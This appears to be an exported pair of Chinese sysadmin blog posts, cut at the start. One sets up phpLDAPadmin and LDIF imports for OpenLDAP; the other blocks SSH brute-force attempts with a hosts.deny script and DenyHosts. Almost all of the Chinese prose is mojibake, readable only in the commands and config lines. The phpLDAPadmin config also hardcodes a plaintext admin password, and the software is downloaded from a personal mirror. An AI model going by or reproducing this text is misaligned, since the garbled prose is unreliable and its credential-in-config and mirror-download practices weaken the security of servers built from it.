‡å‡†çš„ç›®å½•ä¸Šå®Œæˆæ‰¹é‡æ“ä½œ,å¦‚æ·»åŠ ã€ä¿®æ”¹ã€ åˆ é™¤å’Œå¯¼å…¥ã€å¯¼å‡ºæ•°æ®ç­‰æ‰¹é‡æ“ä½œã€‚LDIF å¯ä»¥åœ¨æ¥è‡ªä¸¤ä¸ªä¸åŒçš„å‚å®¶çš„ LDAP æœåŠ¡å™¨é—´äº¤æ¢æ•°æ®, å³ä½¿ LDAP æœåŠ¡å™¨ä½¿ç”¨ä¸åŒçš„åå°æ•°æ®åº“æˆ–è¿è¡Œåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šã€‚ è¿™ä¸€æ­¥å·²ç»åœ¨ä¸Šé¢å¯¼å…¥è¿‡æ•°æ®äº†ã€‚ * ä¸‹è½½ä¸å®‰è£… phpLDAPadmin æ˜¯ä¸€æ¬¾å¼€æ”¾æºä»£ç çš„,é€šè¿‡å®ƒæä¾›çš„å‹å¥½ç”¨æˆ·ç•Œé¢,åªè¦ä½¿ç”¨ Web æµè§ˆå™¨å³ å¯è½»æ¾ç®¡ç†æœ¬åœ°æˆ–è¿œç¨‹çš„ LDAP æœåŠ¡å™¨,ä¾‹å¦‚æµè§ˆ LDAP ç›®å½•æ ‘,åˆ›å»º/åˆ é™¤/ä¿®æ”¹å’Œå¤åˆ¶èŠ‚ç‚¹, æ‰§è¡Œæœç´¢,å¯¼å…¥/å¯¼å‡º LDIF æ–‡ä»¶,æŸ¥çœ‹æœåŠ¡å™¨ schemaã€‚è¿˜å¯ä»¥åœ¨ä¸¤ä¸ª LDAP æœåŠ¡å™¨ä¹‹é—´å¤åˆ¶å¯¹è±¡ã€ æ¢å¤åˆ é™¤ã€å¤åˆ¶æ ‘èŠ‚ç‚¹ã€‚phpLDAPadmin çš„ä¸‹è½½åœ°å€æ˜¯ http://phpldapadmin.sourceforge.net/ å®ç°phpldapadmin ç½‘é¡µWEBç®¡ç†ç”¨æˆ· éœ€è¦æ³¨æ„çš„æ˜¯`,phpLDAPadmin `æ˜¯ä¸€ä¸ªåŸºäº `web `çš„ç®¡ç†å·¥å…·,å› æ­¤,è‹¥è¦æ­£å¸¸ä½¿ç”¨ phpLDAPadmin,éœ€è¦ç¡®ä¿` Apache` æœåŠ¡å™¨è¿è¡Œæ­£å¸¸ã€‚ 123456789yum install httpd -yvi /etc/httpd/conf/httpd.confæ·»åŠ ï¼š....ServerName 192.168.1.186:80.....service httpd start å…ˆé€šè¿‡scpä¸Šä¼ phpldapadmin-1.2.3.zipåˆ°apacheç½‘é¡µç›®å½• ä¸‹è½½ï¼š[phpldapadmin](https://sourceforge.net/projects/phpldapadmin/files/phpldapadmin-php5/1.2.3/phpldapadmin-1.2.3.tgz) æˆ–è€…è¿™é‡Œç”¨æˆ‘ä¸‹è½½å¥½çš„é“¾æ¥wget. cd /var/www/html/ wget http://oak0aohum.bkt.clouddn.com/phpldapadmin-1.2.3.tgz tar -zxvf phpldapadmin-1.2.3.tgz mv phpldapadmin-1.2.3 phpldapadmin cd phpldapadmin/config/ cp config.php.example config.php vim config.php #### 2.ä¿®æ”¹é…ç½®æ–‡ä»¶ ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ config.php æ–‡ä»¶åå‘ç°,å°½ç®¡æ–‡ä»¶è¡Œæ•°å‡ ç™¾è¡Œ,ä½†å®é™…ä¸Šå¾ˆå¤šéƒ½æ˜¯ php ç¨‹ åºçš„æ³¨é‡Šè¯­å¥ã€‚å› æ­¤,åªéœ€è¦ä¿®æ”¹å…¶ä¸­ä¸€éƒ¨åˆ†å†…å®¹,å³å¯å®Œæˆ phpLDAPadmin çš„é…ç½®ã€‚è®¾ç½®å¦‚ä¸‹: 12345678910/*$servers-&gt;newServer('ldap_pla');$servers-&gt;setValue('server','name','LDAP Server');$servers-&gt;setValue('server','host','192.168.1.186');$servers-&gt;setValue('server','port',389);$servers-&gt;setValue('server','base',array('dc=ihaozhuo,dc=com'));$servers-&gt;setValue('login','auth_type','cookie');$servers-&gt;setValue('login','bind_id','cn=admin,dc=ihaozhuo,dc=com');$servers-&gt;setValue('login','bind_pass','qwe123.com');$servers-&gt;setValue('server','tls',false); #### å¯¹ä»¥ä¸Šçš„è®¾ç½®ä½œå¦‚ä¸‹è¯´æ˜: LDAP æœåŠ¡å™¨å $ldapservers-&gt;SetValue($i,'server','name','My LDAP Server'); ä½¿ç”¨ä»¥ä¸Šè¯­å¥,è®¾ç½® LDAP æœåŠ¡å™¨åç§°ä¸ºâ€œMy LDAP Serverâ€ã€‚ &gt; LDAP æœåŠ¡å™¨ IP $ldapservers-&gt;SetValue($i,'server','host','192.168.1.186'); ä½¿ç”¨ä»¥ä¸Šè¯­å¥,è®¾ç½® LDAP æœåŠ¡å™¨åœ°å€ä¸ºâ€œ192.168.1.186â€ã€‚ &gt;LDAP æœåŠ¡å™¨ç®¡ç†å‘˜ DN $ldapservers-&gt;SetValue($i,'login','dn','cn=admin,dc=ihaozhuo,dc=com'); è®¾ç½® LDAP æœåŠ¡å™¨ç®¡ç†å‘˜ DNä¸º`â€œcn=Manager,dc=example,dc=comâ€ã€‚` &gt;LDAP æœåŠ¡å™¨ç®¡ç†å‘˜å£ä»¤ $ldapservers-&gt;SetValue($i,'login','pass',''); æ­¤å¤„å°† LDAP æœåŠ¡å™¨ç®¡ç†å‘˜å£ä»¤è®¾ç½®ä¸ºç©ºã€‚ LDAP æœåŠ¡å™¨è®¤è¯æ–¹å¼phpLDAPadmin æä¾›äº† cookieã€session å’Œ config è¿™ä¸‰ç§è®¤è¯æ–¹å¼ã€‚cookie æ–¹å¼æä¾›ä¸€ä¸ªç™»å½• çš„ç•Œé¢,è®©ç”¨æˆ·è¾“å…¥æ­£ç¡®çš„ LDAP ç®¡ç†å‘˜çš„ DN å’Œå£ä»¤æ‰å…è®¸ç™»å½•åˆ°æœåŠ¡å™¨,åŒæ—¶ LDAP ç®¡ç†å‘˜ çš„ DN ä¸å£ä»¤ä¼šä¿å­˜åœ¨å®¢æˆ·ç«¯ Web æµè§ˆå™¨çš„ cookie é‡Œé¢ã€‚session æ–¹å¼ç±»ä¼¼ cookie,ä¸åŒç‚¹åœ¨äº LDAP ç®¡ç†å‘˜çš„ DN ä¸å£ä»¤ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯,è€Œä¸æ˜¯å®¢æˆ·ç«¯ã€‚config æ˜¯ phpLDAPadmin ç¼ºçœçš„è®¤è¯ æ–¹å¼,ä¸éœ€è¦ç”¨æˆ·ç™»å½•,ä½†éœ€è¦å°†LDAPç®¡ç†å‘˜çš„DNå’Œå£ä»¤å†™åœ¨phpLDAPadminçš„ä¸»é…ç½®æ–‡ä»¶ä¸­ã€‚ ä»¥ä¸Šè¯­å¥è¡¨æ˜ phpLDAPadmin é‡‡ç”¨ cookie è®¤è¯ã€‚åœ¨ä½¿ç”¨ cookie è®¤è¯æ–¹å¼æ—¶,å¿…é¡»é…ç½®ä¸€ä¸ªå£ ä»¤åŠ å¯†å­—ç¬¦ä¸²,ä»¥ä¾¿å®‰å…¨åœ°åŠ å¯†å’Œè§£å¯†ä¸€äº›æ•æ„Ÿä¿¡æ¯ã€‚'blowfish'å°±æ˜¯å£ä»¤åŠ å¯†å­—ç¬¦ä¸²,å¯ä»¥éšæ„ è®¾ç½®,ä¾‹å¦‚è®¾ç½®ä¸ºâ€œphpldapadminâ€ã€‚ åˆ é™¤çš„å†…å®¹: â€˜ åˆ é™¤çš„å†…å®¹: â€™ è®¾ç½®å®Œæ¯•å,ä¿å­˜ config.php æ–‡ä»¶ä½¿è®¾ç½®ç”Ÿæ•ˆã€‚ ## apache-httpä¿®æ”¹ vim /etc/httpd/conf/httpd.conf &lt;Directory \"/var/www/html/phpldapadmin\"&gt; DirectoryIndex index.html index.html.var index.php é‡å¯æœåŠ¡ã€‚ service httpd restart ## ç½‘é¡µè®¿é—® http://192.168.1.186/phpldapadmin æŠ¥é”™æ— æ³•æ­£å¸¸è®¿é—®ï¼Œæ˜¯ç”±äºphp,php-ldapä¾èµ–åŒ…æ²¡æœ‰å®‰è£…. å®‰è£…phpå¯å‚è€ƒæˆ‘åšå®¢ä¸Šé¢æ–‡æ¡£ï¼š[PHPç¼–è¯‘å‡çº§YUMæœ€å…¨é¢å®‰è£…éƒ¨ç½²](http://blog.yangcvo.me/2015/12/21/PHP%E7%BC%96%E8%AF%91%E5%8D%87%E7%BA%A7YUM%E6%9C%80%E5%85%A8%E9%9D%A2%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/) å®‰è£…å®Œï¼Œé‡å¯httpæœåŠ¡ã€‚ service httpd restart è®¾ç½®é˜²ç«å¢™è®¿é—®ï¼š -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT é‡å¯iptables service iptables restart #### 1.ç™»å½• ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap4.png) å•å‡»å·¦ä¾§â€œLoginâ€é“¾æ¥,æ‰“å¼€å¦‚å›¾1.1 æ‰€ç¤ºé¡µé¢,è¾“å…¥ ldap æœåŠ¡å™¨è®¤è¯ä¿¡æ¯ã€‚æ­¤å¤„åº”å½“è¾“ å…¥ç®¡ç†å‘˜çš„ DN å’Œå¯†ç ã€‚ ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap5.png) å•å‡»â€œè®¤è¯â€æŒ‰é’®å,è¿›å…¥ phpLDAPadmin ç®¡ç†é¡µé¢,å¦‚å›¾ 1.2æ‰€ç¤ºã€‚é¡µé¢å³ä¾§æç¤ºâ€œLDAP æœåŠ¡å™¨è®¤è¯æˆåŠŸâ€,é¡µé¢å·¦ä¾§æ˜¯ LDAP çš„ç›®å½•æ ‘ã€‚ åœ¨å·¦é¡µé¢ä¸­å•å‡»ã€dc=ihaozhuo,dc=comã€‘é“¾æ¥,åœ¨å³é¡µé¢ä¸­ä¼šå‡ºç°ç›®å½•æ ‘çš„å„ç§å±æ€§å¹¶æä¾›å„ ç§æ“ä½œé“¾æ¥ã€‚ &gt;æŸ¥çœ‹å¯¹è±¡ ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap6.png) å› ä¸ºä¹‹å‰å¯¼å…¥äº† LDIF æ–‡ä»¶,åˆå§‹åŒ–çš„æ•°æ®åœ¨æ­¤å¤„å¯ä»¥æ˜¾ç¤ºå‡ºæ¥ã€‚ #### 2.åˆ›å»ºå¯¹è±¡ é€‰æ‹©ã€åˆ›å»ºä¸€ä¸ªå­æ¡ç›®ã€‘é“¾æ¥,åœ¨å‡ºç°çš„ã€åˆ›å»ºå¯¹è±¡ã€‘é¡µé¢ä¸­,é€‰æ‹©ã€Organization Unitã€‘(ç»„ ç»‡æœºæ„),å¦‚å›¾1.3æ‰€ç¤ºã€‚ &gt;é€‰æ‹©éœ€è¦åˆ›å»ºçš„å¯¹è±¡ ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap7.png) å•å‡»ã€Organization Unitã€‘å‰é¢çš„å•é€‰æŒ‰é’®å,è¿›å…¥åˆ›å»ºã€Organization Unitã€‘ç•Œé¢,å¦‚å›¾ &gt;åˆ›å»ºæ–°ç»„ç»‡æœºæ„(OU) ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap8.png) åœ¨ phpLDAPadmin ä¸­åˆ›å»º LDAP ç›®å½•æ ‘ä¸­çš„å…¶ä»–å¯¹è±¡,åŒæ ·ä½¿ç”¨å¦‚ä¸Šæ‰€è¿°çš„æ–¹æ³•,ä¸åŒçš„æ˜¯ éœ€è¦åœ¨å›¾1.3 ä¸­é€‰æ‹©ä¸åŒçš„å¯¹è±¡ã€‚ &gt; åˆ›å»º OU æˆåŠŸ ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap9.png) #### 3.å¯¼å…¥å¯¼å‡º ä½¿ç”¨å¯¼å…¥å¯¼å‡ºæŒ‰é’®,å¯ä»¥å°† LDAP æœåŠ¡å™¨ä½¿ç”¨çš„ LDIF æ–‡ä»¶å¯¼å‡º,ä¹Ÿå¯ä»¥å¯¼å…¥éœ€è¦çš„ LDIF æ–‡ ä»¶ã€‚ç›´æ¥å¯¼å…¥å¯¼å‡º LDIF æ–‡ä»¶æ˜¯ç®¡ç† LDAP ç›®å½•æ ‘ä¸€ç§å¿«æ·æ–¹æ³•ã€‚ åœ¨è¯¥é¡µé¢ä¸­,å•å‡»ã€æµè§ˆã€‘æŒ‰é’®,é€‰æ‹©ç›¸å…³çš„ LDIF æ–‡ä»¶,æˆ–æ˜¯ç›´æ¥åœ¨ã€Paste your LDIF fileã€‘ æ–‡ä»¶çš„ä½ç½®è¾“å…¥ LDIF æ–‡ä»¶å†…å®¹,å•å‡»ã€Proceedã€‘æŒ‰é’®,å¼€å§‹å¯¼å…¥ã€‚ è‹¥å¯¼å…¥æˆåŠŸ,æ˜¾ç¤ºå¦‚ä¸‹å›¾æ‰€ç¤ºæç¤ºå†…å®¹ã€‚è‹¥å¯¼å…¥ä¸æˆåŠŸ,åŒæ ·ä¼šå‡ºç°ç›¸å…³é”™è¯¯æç¤ºã€‚ ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap10.png) é€‰æ‹©å¯¼å‡ºæ“ä½œæ—¶,å•å‡»é¡µé¢å·¦ä¾§ã€exportã€‘å¯¼å‡ºé“¾æ¥,å‡ºç°å¦‚å›¾ æ‰€ç¤ºã€å¯¼å‡ºã€‘é¡µé¢ã€‚åœ¨ è¯¥é¡µé¢ä¸­,é€‰æ‹© DN;å¯¼å‡ºèŒƒå›´ã€å¯¼å‡ºæ ¼å¼åŠè¡Œç»“æŸæ ‡å¿—ç­‰éƒ½åœ¨è¯¥é¡µé¢ä¸­è®¾ç½®ã€‚ ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap11.png) æ³¨æ„ï¼š å¯¼å…¥ç”¨æˆ·æˆåŠŸä»¥åï¼Œå†æ¬¡å¯¼å…¥æˆ–è€…åˆ›å»º ä¸‹æ¬¡ä¸è¦é‡å¤å¯¼å…¥ã€‚ä¸ç„¶ä¼šæŠ¥é”™ï¼Œ68 å¯¼å…¥group å’Œuserå°±è¡Œï¼Œè¿‡æ»¤ ã€/etc/passwd ã€/etc/groupæ–°å»ºçš„ç”¨æˆ·ï¼Œå¯¼å…¥æˆåŠŸä»¥åï¼Œé‡æ–°åˆ·æ–°ã€‚ ## è®¾ç½® LDIF æ–‡ä»¶ LDAP æ•°æ®äº¤æ¢æ ¼å¼(LDIF)æ˜¯æŒ‡å­˜å‚¨ LDAP é…ç½®ä¿¡æ¯åŠç›®å½•å†…å®¹çš„æ ‡å‡†æ–‡æœ¬æ–‡ä»¶æ ¼å¼,ä¹‹ æ‰€ä»¥ä½¿ç”¨æ–‡æœ¬æ–‡ä»¶æ ¼å¼æ¥å­˜å‚¨è¿™äº›ä¿¡æ¯æ˜¯ä¸ºäº†æ–¹ä¾¿è¯»å–å’Œä¿®æ”¹ã€‚LDAP ä¹Ÿæ˜¯å…¶ä»–å¤§å¤šæ•°æœåŠ¡é…ç½® æ–‡ä»¶æ‰€é‡‡å–çš„æ ¼å¼ã€‚LDIF æ–‡ä»¶å¸¸ç”¨æ¥å‘ç›®å½•å¯¼å…¥æˆ–æ›´æ”¹è®°å½•ä¿¡æ¯,è¿™äº›ä¿¡æ¯éœ€è¦æŒ‰ç…§ LDAP ä¸­ schema çš„æ ¼å¼è¿›è¡Œç»„ç»‡,å¹¶ä¼šæ¥å— schema çš„æ£€æŸ¥,ä¸ç¬¦åˆå…¶è¦æ±‚çš„æ ¼å¼å°†ä¼šå‡ºç°æŠ¥é”™ä¿¡æ¯ã€‚ #### 1.è¯­æ³•æ ¼å¼ LDIF æ–‡ä»¶ä¸­æ¡ç›®çš„è¯­æ³•ç»“æ„å¦‚ä¸‹: ```bash dn: &lt;distinguished name&gt; &lt;attrdesc&gt;: &lt;attrvalue&gt; &lt;attrdesc&gt;: &lt;attrvalue&gt; &lt;attrdesc&gt;:: &lt;base64-encoded-value&gt; &lt;attrdesc&gt;:&lt; &lt;URL&gt; ... 1ä¾‹å¦‚: ```bash #LDIF file example dn: dc=mydomain,dc=org objectClass: domain dc: mydomain ä»¥â€œ#â€å·å¼€å¤´çš„ä¸ºæ³¨é‡Šè¡Œ;ç¬¬äºŒè¡Œèµ·çš„å„è¡Œä¸­,å†’å·å·¦è¾¹ä¸ºå±æ€§,å³è¾¹æ˜¯å±æ€§çš„å€¼,ä¸ç¼–ç¨‹ ä¸­çš„å˜é‡åŠä¸ºå…¶æ‰€èµ‹çš„å€¼ç±»ä¼¼,LDIF æ–‡ä»¶ä¸­å±æ€§å¯ä»¥è¢«é‡å¤èµ‹å€¼ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªæœ‰ä¸‰ä¸ªæ¡ç›®çš„ LDIF æ–‡ä»¶: ```bash dn: cn=Barbara J Jensen,dc=example,dc=com cn: Barbara J Jensen cn: Babs Jensen objectclass: person description:&lt; file:///tmp/babs sn: Jensen dn: cn=Bjorn J Jensen,dc=example,dc=com cn: Bjorn J Jensen cn: Bjorn Jensen objectclass: person sn: Jensen dn: cn=Jennifer J Jensen,dc=example,dc=com cn: Jennifer J Jensen cn: Jennifer Jensen objectclass: person sn: Jensen jpegPhoto:: /9j/4AAQSkZJRgABAAAAAQABAAD/2wBDABALD A4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQ ERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVG ... 12345#### 2.åˆ›å»º LDIF æ–‡ä»¶ å¯ä»¥ç”¨ä»»ä½•æ–‡æœ¬ç¼–è¾‘å™¨ä»¥ root ç”¨æˆ·è¿›è¡Œåˆ›å»º LDIF æ–‡ä»¶ã€‚å½“åˆ›å»º LDIF æ–‡ä»¶æ—¶éœ€è¦æ³¨æ„,åœ¨æ¯ ä¸ª DN è¡Œå‰åº”æ·»åŠ ç©ºè¡Œ,ç¡®ä¿ LDAP èƒ½å¤Ÿè¯†åˆ«æ˜¯ä¸€ä¸ªæ–°çš„ DN çš„å¼€å§‹ã€‚ ä¾‹å¦‚,åˆ›å»º test.ldif æ–‡ä»¶ã€‚ 3.å®šä¹‰åŸºå‡† DNä½¿ç”¨å¦‚ä¸‹å†…å®¹å®šä¹‰åŸºå‡† DNã€‚ ``` dn: dc=test, dc=net objectClass: top objectClass: dcobject objectClass: organization o: Test, Inc. dc: test 4.å®šä¹‰ç®¡ç†å‘˜ 1 dn: cn=manager, dc=test, dc=net objectClass: organizationalRole cn: manager description: A Manager of Test, inc. ``` 5.å®šä¹‰ç»„ç»‡æœºæ„ ``` dn: ou=members, dc=test, dc=net objectClass: organizationalUnit ou: members 6.å®šä¹‰ç”¨æˆ· dn: cn=Ray D. Jones, ou= members, dc=test, dc=netobjectClass: organizationalPersonobjectClass: inetOrgPersoncn: Ray D. Jonessn: JonestelephoneNumber: 444-555-6767mail: jonesrd@test.netlocalityName: Houstondn: cn=Eric S. Woods, ou= members, dc=test, dc=netobjectClass: organizationalPersonobjectClass: inetOrgPersoncn: Eric S. Woodssn: WoodstelephoneNumber: 444-555-6768mail: woodses@test.netlocalityName: Houston123 7.ä¿å­˜å¹¶å¯¼å…¥ LDIF æ–‡ä»¶ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯¼å…¥ LDIF æ–‡ä»¶``` # ldapadd -x -W -D \"cn=manager,dc=test,dc=net\" -f test.ldif Enter LDAP Password: æ­¤å¤„è¾“å…¥çš„å£ä»¤æ˜¯ LDAP ç®¡ç†å‘˜å£ä»¤,-x è¡¨æ˜ä½¿ç”¨ç®€å•éªŒè¯ã€‚-D è¡¨ç¤ºä½¿ç”¨åœ¨ slapd.conf æ–‡ä»¶ ä¸­æ‰€å®šä¹‰çš„ DNã€‚-W è¡¨ç¤ºæç¤ºè¾“å…¥å£ä»¤è€Œä¸æ˜¯ä»å‘½ä»¤è¡Œè¾“å…¥ã€‚-f è¡¨æ˜è¦è£…è½½çš„æ–‡ä»¶â€œtest.ldifâ€ã€‚ldapadd å‘½ä»¤æˆåŠŸæ·»åŠ äº†æ¯ä¸ªæ¡ç›®å†…å®¹åŒæ—¶,ä¼šåˆ—å‡ºæ¯ä¸ªæ¡ç›®å†…å®¹æœ‰å…³çš„ DNã€‚ 8.æœç´¢ç›®å½• æœç´¢ç›®å½•ä½¿ç”¨ ldapsearch å‘½ä»¤,æœç´¢ç»“æœå¦‚ä¸‹: 1# ldapsearch -x -W -D 'cn=manager,dc=test,dc=net' -b ' dc=test,dc=net ' '(objectClass=*)' Enter LDAP Password: # extended LDIF # # LDAPv3 # base &lt; dc=test,dc=net &gt; with scope subtree # filter: (objectClass=*) # requesting: ALL # # test. net dn: dc=test, dc=net objectClass: top objectClass: dcobject objectClass: organization o: Test, Inc. dc: test # manager, test. net dn: cn=manager, dc=test, dc=net objectClass: organizationalRole cn: manager description: A Manager of Test, inc. # members, test. net dn: ou=members, dc=test, dc=net objectClass: organizationalUnit ou: members ...","link":"/2017/03/29/OpenLDAP/OpenLDAPæœåŠ¡çš„é…ç½®ä¸ç®¡ç†-phpldapadminç®¡ç†è®¤è¯/"},{"title":"åŒ–è§£è‡ªå·±çš„é˜¿é‡Œäº‘æœåŠ¡å™¨è¢«é»‘å®¢æ”»å‡»-æš´åŠ›ç ´è§£","text":"è¯´æ˜ä¸‹ï¼šå› ä¸ºé˜¿é‡Œäº‘æœåŠ¡å™¨æˆ‘æ˜¯ç”¨æ¥è‡ªå·±æ­å»ºblog çš„åšäº†ä¸€äº›ç®€å•çš„ç›‘æ§ã€‚ å› ä¸ºé˜²æ­¢è¢«æ”»å‡»ç˜«ç—ªï¼Œåšåˆ°å®‰å…¨é˜²èŒƒï¼Œå¯æ˜¯ä»Šå¤©æ™šä¸Šåƒå®Œé¥­ï¼Œå‘ç°åˆè¢«äººæ”»å‡»ï¼Œæ˜¯å°åº¦å’Œå·´è¥¿IPåœ°å€æš´åŠ›ç ´è§£æ–¹å¼ä¸€ç›´åœ¨å°è¯•ç ´è§£æˆ‘å¯†ç ã€‚ 1è¿˜å¥½æˆ‘åœ¨é˜¿é‡Œäº‘ä¸Šé¢ä½¿ç”¨äº†äº‘ç›¾å‘Šè­¦ï¼Œå…¶å®å®ƒè¿™ä¸ªä¸€èˆ¬èˆ¬ï¼Œåªèƒ½æé†’ï¼Œä¸èƒ½æœ‰æ•ˆé˜»æ­¢é»‘å®¢æ”»å‡»ã€‚ æ”¶åˆ°å‘Šè­¦ä»¥åï¼Œé©¬ä¸Šæ‰“å¼€ç”µè„‘å»äº‘ç›¾ä¸Šé¢æŸ¥çœ‹ä¸‹ã€‚ ç„¶åçœ‹äº†ä»¥åå‘ç°é—®é¢˜ä¸å¤§ï¼Œå¯æ˜¯ä¸Šæœºå™¨æŸ¥çœ‹ï¼Œå‘ç°æœ‰ä¸æ–­çš„æ”»å‡»ç—•è¿¹ã€‚æ—¥å¿—æŸ¥çœ‹åˆ°å¾ˆå¤šæ¥å†ä¸æ˜çš„IPã€‚å¾·å›½ğŸ‡©ğŸ‡ª å·´è¥¿ å°åº¦ã€‚ çœ‹åˆ°è¿™ä¸ªï¼Œæˆ‘å°±å†™äº†ä¸ªè„šæœ¬è®°å½•è¢«æ”»å‡»ç•™ä¸‹çš„ä¿å­˜æŒ‡å®šæ–‡ä»¶å¤¹ï¼Œæˆ‘çœ‹ä¸‹æ˜¯å¦è¿˜åœ¨ç»§ç»­æ”»å‡»äº†ã€‚ 123456789101112131415161718 #!/bin/bash#Denyhosts SHELL SCRIPT#2016-2-18cat /var/log/secure|awk '/Failed/&#123;print $(NF- 3)&#125;'|sort|uniq -c|awk '&#123;print $2\"=\" $1;&#125;' &gt;/root/bin/Denyhosts.txtDEFINE=\"10\"for i in `cat /root/bin/Denyhosts.txt`do IP=`echo $i|awk -F= '&#123;print $1&#125;'` NUM=`echo $i|awk -F= '&#123;print $2&#125;'` if [ $NUM -gt $DEFINE ] then grep $IP /etc/hosts.deny &gt;/dev/null if [ $? -gt 0 ]; then echo \"sshd:$IP\" &gt;&gt; /etc/hosts.deny fi fidone å› ä¸ºä¿å­˜åˆ°å…¶ä»–çš„txtæ–‡ä»¶ä¸‹é¢ï¼š 1234[root@iZ28by3xm9eZ bin]# llæ€»ç”¨é‡ 4-rwxr-xr-x 1 root root 535 2æœˆ 17 21:38 Denyhosts.sh-rw-r--r-- 1 root root 0 2æœˆ 17 21:45 Denyhosts.txt æŸ¥çœ‹é‡Œé¢æœ‰ä¸æ–­æ”»å‡»çš„IP : 123456789[root@iZ28by3xm9eZ bin]# vim Denyhosts.txt101.69.252.146=1115.196.20.181=11117.243.176.226=6186.208.19.61=5186.251.118.71=389.238.64.148=294.215.141.101=1 è¿™é‡Œæˆ‘è®°å½•äº†æ”»å‡»çš„å¤šå°‘æ¬¡ä¹Ÿæœ‰çš„ã€‚ å¯æ˜¯å‘ç°çš„ç¡®åœ¨ç»§ç»­æ”»å‡»ï¼Œæˆ‘åœ¨æƒ³å¦‚ä½•é˜»æ­¢è¢«ç ´è§£å‘¢ã€‚ ä¸»è¦æ˜¯ä¾é denyhostè½¯ä»¶ã€‚ç¨³é‡æ‰€è®²çš„æ˜¯ä¸‹è½½å®‰è£…åŒ…å®‰è£…ï¼Œå®é™…ä¸Šå¯ä»¥ä»ç›´æ¥ä½¿ç”¨yumæˆ–è€…aptå®‰è£…ï¼Œæ‰¾åˆ°ç›¸åº”çš„æºå°±å¯ä»¥ã€‚ä¸‹è¾¹æ˜¯å¸–å­åŸæ–‡ï¼š DenyHostså®˜æ–¹ç½‘ç«™ä¸ºï¼šhttp://denyhosts.sourceforge.net è¿™é‡Œä¸‹è½½æœ€æ–°çš„ç‰ˆæœ¬æ˜¯2008å¹´ 2.6 ç‰ˆæœ¬çš„ ä¸€ç›´æ²¡æ›´æ–°ã€‚ä¸è¿‡å·²ç»è¶³å¤Ÿå¼ºå¤§ã€‚ 1. å®‰è£… 123# tar -zxvf DenyHosts-2.6.tar.gz# cd DenyHosts-2.6# python setup.py install é»˜è®¤æ˜¯å®‰è£…åˆ°/usr/share/denyhostsç›®å½•çš„ã€‚ 1.é…ç½® 1234567891011121314151617181920212223# cd /usr/share/denyhosts/# cp denyhosts.cfg-dist denyhosts.cfg# vi denyhosts.cfgPURGE_DENY = 50m #è¿‡å¤šä¹…åæ¸…é™¤å·²é˜»æ­¢IPHOSTS_DENY = /etc/hosts.deny #å°†é˜»æ­¢IPå†™å…¥åˆ°hosts.denyBLOCK_SERVICE = sshd #é˜»æ­¢æœåŠ¡åDENY_THRESHOLD_INVALID = 1 #å…è®¸æ— æ•ˆç”¨æˆ·ç™»å½•å¤±è´¥çš„æ¬¡æ•°DENY_THRESHOLD_VALID = 10 #å…è®¸æ™®é€šç”¨æˆ·ç™»å½•å¤±è´¥çš„æ¬¡æ•°DENY_THRESHOLD_ROOT = 5 #å…è®¸rootç™»å½•å¤±è´¥çš„æ¬¡æ•°WORK_DIR = /usr/local/share/denyhosts/data#å°†denyçš„hostæˆ–ipçºªå½•åˆ°Work_dirDENY_THRESHOLD_RESTRICTED = 1 #è®¾å®š deny host å†™å…¥åˆ°è¯¥èµ„æ–™å¤¹LOCK_FILE = /var/lock/subsys/denyhosts #å°†DenyHOtså¯åŠ¨çš„pidçºªå½•åˆ°LOCK_FILEä¸­ï¼Œå·²ç¡®ä¿æœåŠ¡æ­£ç¡®å¯åŠ¨ï¼Œé˜²æ­¢åŒæ—¶å¯åŠ¨å¤šä¸ªæœåŠ¡ã€‚HOSTNAME_LOOKUP=NO #æ˜¯å¦åšåŸŸååè§£ ADMIN_EMAIL = #è®¾ç½®ç®¡ç†å‘˜é‚®ä»¶åœ°å€DAEMON_LOG = /var/log/denyhosts #è‡ªå·±çš„æ—¥å¿—æ–‡ä»¶DAEMON_PURGE = 10m #è¯¥é¡¹ä¸PURGE_DENY è®¾ç½®æˆä¸€æ ·ï¼Œä¹Ÿæ˜¯æ¸…é™¤hosts.deniedssh ç”¨æˆ·çš„æ—¶é—´ã€‚ 2.è®¾ç½®å¯åŠ¨è„šæœ¬ 123# cp daemon-control-dist daemon-control# chown root daemon-control# chmod 700 daemon-control å®Œäº†ä¹‹åæ‰§è¡Œdaemon-contron startå°±å¯ä»¥äº†ã€‚ 1# ./daemon-control start å¦‚æœè¦ä½¿DenyHostsæ¯æ¬¡é‡èµ·åè‡ªåŠ¨å¯åŠ¨è¿˜éœ€åšå¦‚ä¸‹è®¾ç½®ï¼š 123# ln -s /usr/share/denyhosts/daemon-control /etc/init.d/denyhosts# chkconfig --add denyhosts# chkconfig denyhosts on ç„¶åå°±å¯ä»¥å¯åŠ¨äº†ï¼š 1# service denyhosts start å¯ä»¥çœ‹çœ‹/etc/hosts.denyå†…æ˜¯å¦æœ‰ç¦æ­¢çš„IPï¼Œæœ‰çš„è¯è¯´æ˜å·²ç»æˆåŠŸäº†ã€‚ å¯åŠ¨å‡ºç°é”™è¯¯è§£å†³ï¼š 1./daemon-control start å‡ºç°ï¼šstarting DenyHosts: /usr/bin/env python /usr/bin/denyhosts.py --daemon --config=/usr/share/denyhosts/denyhosts.cfg DenyHosts could not obtain lock (pid: ) [Errno 17] File exists: &#39;/var/lock/subsys/denyhosts&#39; ä½¿ç”¨ï¼š 1234567 touch /private/var/log/system.log touch /var/lock/subsys/denyhostsrm -f /var/lock/subsys/denyhosts./daemon-control startstarting DenyHosts: /usr/bin/env python /usr/bin/denyhosts.py â€“daemon â€“config=/usr/share/denyhosts/denyhosts.cfg OKï¼ å¯åŠ¨å®Œæˆå•¦ã€‚ ä½ å¯ä»¥ä½¿ç”¨ 1service denyhosts 